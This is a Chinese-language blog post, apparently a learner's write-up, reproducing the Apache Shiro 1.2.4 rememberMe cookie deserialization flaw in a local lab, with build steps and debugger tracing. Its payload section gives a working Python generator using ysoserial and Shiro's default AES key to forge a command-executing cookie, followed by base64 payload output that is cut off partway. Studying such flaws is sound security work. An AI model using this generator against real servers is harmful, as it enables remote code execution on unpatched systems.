@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>我的漏洞分析学习之路三 | langke Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">langke&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">langke&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div id="post-toc" class="post-toc">
+            <span class="post-toc-title">catalogue</span>
+            <div class="post-toc-content">
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#我的漏洞分析学习之路三"><span class="toc-text">我的漏洞分析学习之路三</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#apache-shiro-1-2-4（issue-550）"><span class="toc-text">apache shiro 1.2.4（issue 550）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#应用介绍"><span class="toc-text">应用介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#环境搭建"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#调试分析"><span class="toc-text">调试分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#工具准备"><span class="toc-text">工具准备</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#加密过程"><span class="toc-text">加密过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#解密过程"><span class="toc-text">解密过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#发送自己的rememberMe"><span class="toc-text">发送自己的rememberMe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#定制payload"><span class="toc-text">定制payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp构造"><span class="toc-text">exp构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#补充（为什么遍历KEY）"><span class="toc-text">补充（为什么遍历KEY）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#KEY遍历方法"><span class="toc-text">KEY遍历方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol></li></ol>
+            </div>
+        </div>
+    
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">我的漏洞分析学习之路三</h1>
+            
+                <div class="post-meta">
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">08 30&nbsp;&nbsp;15:24:41</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <section class="post-content">
+            <h1 id="我的漏洞分析学习之路三"><a href="#我的漏洞分析学习之路三" class="headerlink" title="我的漏洞分析学习之路三"></a>我的漏洞分析学习之路三</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是我漏洞学习之路的第三篇了。前面学习了一些漏洞分析前的基础，可能不全。毕竟我是新手嘛，不知道都要学些什么，只能摸着石头过河了。今天开始尝试看大佬们的cve漏洞分析文章，初步复现大佬们的分析过程。</p>
+<h2 id="apache-shiro-1-2-4（issue-550）"><a href="#apache-shiro-1-2-4（issue-550）" class="headerlink" title="apache shiro 1.2.4（issue 550）"></a>apache shiro 1.2.4（issue 550）</h2><p>网上没有找到CVE编号，但这并不影响我学习。</p>
+<h3 id="应用介绍"><a href="#应用介绍" class="headerlink" title="应用介绍"></a>应用介绍</h3><pre><code>Apache Shiro™是一个功能强大且易于使用的Java安全框架，它执行身份验证，授权，加密和会话管理。使用Shiro易于理解的API，您可以快速轻松地保护任何应用程序-从最小的移动应用程序到最大的Web和企业应用程序。
+
+在它编号为550的 issue 中爆出严重的 Java 反序列化漏洞。Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。
+</code></pre><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><strong>tomcat：<a href="https://tomcat.apache.org/" target="_blank" rel="noopener">https://tomcat.apache.org/</a></strong><br>下载即用，无需任何配置。</p>
+<p><strong>Shiro 1.2.4</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 把shiro克隆一份到本地</span><br><span class="line">git clone https://github.com/apache/shiro.git</span><br><span class="line">// 回滚到1.2.4版本</span><br><span class="line">git checkout shiro-root-1.2.4</span><br><span class="line">cd shiro/samples/web</span><br><span class="line">vim pox.xml</span><br></pre></td></tr></table></figure></p>
+<p>配置pox.xml文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// 下面4行为添加行</span><br><span class="line">   &lt;properties&gt;</span><br><span class="line">        &lt;maven.compiler.source&gt;1.6&lt;/maven.compiler.source&gt;</span><br><span class="line">        &lt;maven.compiler.target&gt;1.6&lt;/maven.compiler.target&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line">...</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;jstl&lt;/artifactId&gt;</span><br><span class="line">            &lt;!--  下面一行为添加行   这里需要将jstl设置为1.2 --&gt;</span><br><span class="line">            &lt;version&gt;1.2&lt;/version&gt;    // 添加行</span><br><span class="line">            &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">.....</span><br><span class="line">// 下面4行为添加行</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">&lt;dependencies&gt;</span><br></pre></td></tr></table></figure></p>
+<p>编译，我使用的Centos 7 系统，默认没有maven，安装命令<br><code>sudo yum -y install maven</code><br>编译Shiro命令，在<code>shiro/samples/web</code>目录下。<br><code>mvn package -D maven.skip.test=true</code><br>默认情况下，mvn编译会报错，以所提前先在<code>~/.m2/</code>下新建一个文件<code>toolchains.xml</code>。原因是下面第一行提示：需要使用jdk 1.6版。报错如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[INFO] Required toolchain: jdk [ vendor=&apos;sun&apos; version=&apos;1.6&apos; ]</span><br><span class="line">[ERROR] No toolchain found for type jdk</span><br><span class="line">[ERROR] Cannot find matching toolchain definitions for the following toolchain types:</span><br><span class="line">jdk [ vendor=&apos;sun&apos; version=&apos;1.6&apos; ]</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] BUILD FAILURE</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] Total time: 13:08 min</span><br><span class="line">[INFO] Finished at: 2020-07-24T12:57:20-04:00</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[ERROR] Failed to execute goal org.apache.maven.plugins:maven-toolchains-plugin:1.1:toolchain (default) on project samples-web: Cannot find matching toolchain definitions for the following toolchain types:</span><br><span class="line">[ERROR] jdk [ vendor=&apos;sun&apos; version=&apos;1.6&apos; ]</span><br><span class="line">[ERROR] Please make sure you define the required toolchains in your ~/.m2/toolchains.xml file.</span><br><span class="line">[ERROR] -&gt; [Help 1]</span><br><span class="line">[ERROR] </span><br><span class="line">[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.</span><br><span class="line">[ERROR] Re-run Maven using the -X switch to enable full debug logging.</span><br><span class="line">[ERROR] </span><br><span class="line">[ERROR] For more information about the errors and possible solutions, please read the following articles:</span><br><span class="line">[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException</span><br></pre></td></tr></table></figure></p>
+<p>大部分电脑上安装的java是JDK 1.8，Centos默认安装的是JDK 1.8或者11，所以需要手动安装JDK 1.6，官网地址选一款喜欢的：<br><a href="https://www.oracle.com/java/technologies/javase-java-archive-javase6-downloads.html" target="_blank" rel="noopener">https://www.oracle.com/java/technologies/javase-java-archive-javase6-downloads.html</a><br>安装命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod a+x jdk-6-linux-···.bin</span><br><span class="line">./jdk-6-linux-···.bin</span><br></pre></td></tr></table></figure></p>
+<p>新建文件，命令：<br><code>vim ~/.m2/toolchains.xml</code><br>JDK路径改为自己安装的路径的，一般会默认安装在当前目录。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;toolchains xmlns=&quot;http://maven.apache.org/TOOLCHAINS/1.1.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">  xsi:schemaLocation=&quot;http://maven.apache.org/TOOLCHAINS/1.1.0 http://maven.apache.org/xsd/toolchains-1.1.0.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--插入下面代码--&gt;</span><br><span class="line">  &lt;toolchain&gt;</span><br><span class="line">    &lt;type&gt;jdk&lt;/type&gt;</span><br><span class="line">    &lt;provides&gt;</span><br><span class="line">      &lt;version&gt;1.6&lt;/version&gt;</span><br><span class="line">      &lt;vendor&gt;sun&lt;/vendor&gt;</span><br><span class="line">    &lt;/provides&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">        &lt;!--这里是你安装jdk的文件目录--&gt;</span><br><span class="line">      &lt;jdkHome&gt;/Library/Java/JavaVirtualMachines/1.6.0.jdk/&lt;/jdkHome&gt;</span><br><span class="line">    &lt;/configuration&gt;</span><br><span class="line">  &lt;/toolchain&gt;</span><br><span class="line">&lt;/toolchains&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后再开始编译<br><code>mvn package -D maven.skip.test=true</code><br>经过漫长的下载，一般不会出现意外了。<br>如果是在VPS上面操作，可能会比较快。<br>成功标志<strong>BUILD SUCCESS</strong><br><code>war</code>包被保存在了<code>/home/kali/shiro-shiro-root-1.2.41/samples/web/target/samples-web-1.2.4.war</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[INFO] Packaging webapp</span><br><span class="line">[INFO] Assembling webapp [samples-web] in [/home/kali/shiro-shiro-root-1.2.41/samples/web/target/samples-web-1.2.4]</span><br><span class="line">[INFO] Processing war project</span><br><span class="line">[INFO] Copying webapp resources [/home/kali/shiro-shiro-root-1.2.41/samples/web/src/main/webapp]</span><br><span class="line">[INFO] Webapp assembled in [136 msecs]</span><br><span class="line">[INFO] Building war: /home/kali/shiro-shiro-root-1.2.41/samples/web/target/samples-web-1.2.4.war</span><br><span class="line">[INFO] WEB-INF/web.xml already added, skipping</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] BUILD SUCCESS</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] Total time: 09:16 min</span><br><span class="line">[INFO] Finished at: 2020-07-24T13:25:36-04:00</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br></pre></td></tr></table></figure></p>
+<p>然后把<code>samples-web-1.2.4.war</code>放到<code>tomcat</code>的<code>webapps</code>目录下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\windows\Desktop\apache-tomcat-8.5.32\webapps&gt;dir shiro.war</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 xxxx-xxxx</span><br><span class="line"></span><br><span class="line"> C:\Users\windows\Desktop\apache-tomcat-8.5.32\webapps 的目录</span><br><span class="line"></span><br><span class="line">2020/07/25  17:01         2,134,061 shiro.war</span><br><span class="line">               1 个文件      2,134,061 字节</span><br><span class="line">               0 个目录 44,063,322,112 可用字节</span><br></pre></td></tr></table></figure></p>
+<p>浏览器直接访问项目，就可已部署了。<br><code>http://127.0.0.1:8080/shiro</code><br>看到下面这样的页面，就表示部署成功了。</p>
+<pre>
+<b>Apache Shiro Quickstart</b>
+
+Hi Guest! ( <a href="/shiro_war/login.jsp">Log in</a> (sample accounts provided) )
+
+Welcome to the Apache Shiro Quickstart sample application. This page represents the home page of any web application.
+
+If you want to access the user-only <a href="/shiro_war/account">account page</a>, you will need to log-in first.
+
+<b>Roles</b>
+
+To show some taglibs, here are the roles you have and don't have. Log out and log back in under different user accounts to see different roles.
+
+<b>Roles you have</b>
+
+<b>Roles you DON'T have</b>
+
+admin
+president
+darklord
+goodguy
+schwartz
+</pre>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>官网针对漏洞这样说：</p>
+<blockquote>
+<p>默认情况下，<code>shiro</code>使用<code>CookierMemberManager</code>。这将对用户身份进行序列化、加密和编码，以便以后检索。因此，当它收到来自未经身份验证的用户的请求时，它将通过执行以下操作来查找其记住的身份：</p>
+</blockquote>
+<blockquote>
+<p>检索<code>rememberMe cookie</code>的值<br><code>Base 64</code>解码<br>使用<code>AES</code>解密<br>使用java序列化（ObjectInputStream）反序列化。</p>
+</blockquote>
+<blockquote>
+<p>但是，默认加密密钥是硬编码的，这意味着任何有权访问源代码的人都知道默认加密密钥是什么。因此，攻击者可以创建恶意对象，对其进行序列化、编码，然后将其作为cookie发送。然后Shiro将解码并反序列化，这意味着你的恶意对象现在在服务器上。通过仔细构造对象，可以让它们运行一些恶意代码</p>
+</blockquote>
+<p>Shiro的“记住我”功能是设置cookie中的rememberMe值来实现。所以我们把payload赋值给cookie中的rememberMe键，就可以利用这个漏洞。</p>
+<p>下面根据调试，具体看看shiro对rememberMe的加密解密过程。</p>
+<h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><h4 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h4><p>我这里用的IDEA，官网：<a href="https://www.jetbrains.com/idea/" target="_blank" rel="noopener">https://www.jetbrains.com/idea/</a></p>
+<p>导入：<br><img src="img/Privesc__.png" alt></p>
+<p>配置：<br><img src="leanote://file/getImage?fileId=5f1c6147daf0ed1ccf000001" alt></p>
+<p><img src="leanote://file/getImage?fileId=5f1c6202daf0ed1ccf000002" alt></p>
+<p>开始调试：<br>在网上看了很多资料，知道了shiro的rce漏洞是因为cookie的加密问题。既然要调试程序，首先肯定要设置断点。根据官网介绍，在<code>org.apache.shiro.mgt.RememberMeManager#onSuccessfulLogin</code>处下断点，我在源码处找了半天没找到这个文件。后来才发现，原来在<code>Project</code>下边的<code>外部库</code>里边。<br><img src="leanote://file/getImage?fileId=5f1c645adaf0ed1ccf000003" alt></p>
+<p>然后就找到<code>RememberMeManager</code>文件的<code>onSuccessfulLogin</code>方法调用处下断点。<br>会自动弹出之前设置的浏览器，并且打开shiro应用，我们找到登录页面，输入页面给出的账号密码，勾选<code>Remember Me</code>选项，然后登陆。<br>再返回IDEA编辑器，程序已经运行到断点处，开始调试，<code>F7</code>是进入方法单步调试，<code>F8</code>是不进入方法单步调试。<br><img src="leanote://file/getImage?fileId=5f1c6686daf0ed1ccf000004" alt></p>
+<p><br><br>具体的细节我现在的水平也分析不了，只能大概看看数据的流转过程。<br><br></p>
+<h4 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h4><p>根据分析，得出<code>rememberMe</code>加密的4步处理过程：</p>
+<ol>
+<li>把身份通过序列化转换成字节<br><img src="leanote://file/getImage?fileId=5f1d2cf0ebfc8d6675000002" alt></li>
+<li>进行AES加密<br><img src="leanote://file/getImage?fileId=5f1d3182ebfc8d6675000003" alt><br>写入源码的key<br><img src="leanote://file/getImage?fileId=5f1d31a4ebfc8d6675000004" alt></li>
+<li>进行base64加密<br><code>\org\apache\shiro\web\mgt\CookieRememberMeManager.java</code><br><img src="leanote://file/getImage?fileId=5f1d32d4ebfc8d6675000005" alt></li>
+<li>赋值给请求头和相应头中cookie中的<code>rememberMe</code>键。<br><img src="leanote://file/getImage?fileId=5f1d33deebfc8d6675000006" alt></li>
+</ol>
+<h4 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h4><ol>
+<li>检索<code>cookie</code>中<code>RememberMe</code>的值<br><img src="leanote://file/getImage?fileId=5f1d9f3aebfc8d667500000a" alt></li>
+<li>Base64解码<br><img src="leanote://file/getImage?fileId=5f1da053ebfc8d667500000b" alt></li>
+<li>使用AES解密<br><code>\org\apache\shiro\mgt\AbstractRememberMeManager.java</code><br><img src="leanote://file/getImage?fileId=5f1d68bfebfc8d6675000008" alt></li>
+<li>反序列化<br><code>\org\apache\shiro\mgt\AbstractRememberMeManager.java</code><br><img src="leanote://file/getImage?fileId=5f1d69ccebfc8d6675000009" alt></li>
+</ol>
+<h4 id="发送自己的rememberMe"><a href="#发送自己的rememberMe" class="headerlink" title="发送自己的rememberMe"></a>发送自己的rememberMe</h4><p>之前调试一直被一个问题困扰，就是启动调试后，直接就运行到断点处了，没有自己发送请求的机会。<br>后来请教了大佬同事，才知道为什么。<br>原因是由于我对调试器不熟导致的（新手大多没有耐心把调试器的每一个功能都学习一遍）。点击如下按钮，就可以跳过当前运行，等待下次运行到断点处。有时候需要点击多次，直到按钮变暗为止。<br><img src="leanote://file/getImage?fileId=5f2bb26433a9954f9e000000" alt></p>
+<p>这时我们就可以利用burp发送定制请求包，来调试程序了。<br><img src="leanote://file/getImage?fileId=5f2bc46c33a9954f9e000001" alt></p>
+<h4 id="定制payload"><a href="#定制payload" class="headerlink" title="定制payload"></a>定制payload</h4><p>用网上公开的方法，制作一个payload。python代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">def generator(command, fp):</span><br><span class="line">    if not os.path.exists(fp):</span><br><span class="line">        raise Exception(&apos;jar file not found!&apos;)</span><br><span class="line">    popen = subprocess.Popen([&apos;java&apos;, &apos;-jar&apos;, fp, &apos;CommonsCollections2&apos;, command],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = b&apos;a&apos;*16</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    print(base64_ciphertext.decode())</span><br><span class="line"></span><br><span class="line">generator(&apos;calc.exe&apos;, &apos;ysoserial.jar&apos;)</span><br></pre></td></tr></table></figure></p>
+<p><code>ysoserial.jar</code>这个工具需要和python脚本同一目录下。<br>小坑：Windows系统安装<code>Crypto</code>库的时候，以前用的是<code>Crypto</code>，需要下载几个G的vs编译安装。现在直接安装Cryptodome库就可以了。<br>这个脚本运行完会生成一个base64加密的字符串，直接复制到请求包中的cookie的<code>rememberMe</code>后面即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\windows\Desktop&gt;python3 payload.py</span><br><span class="line">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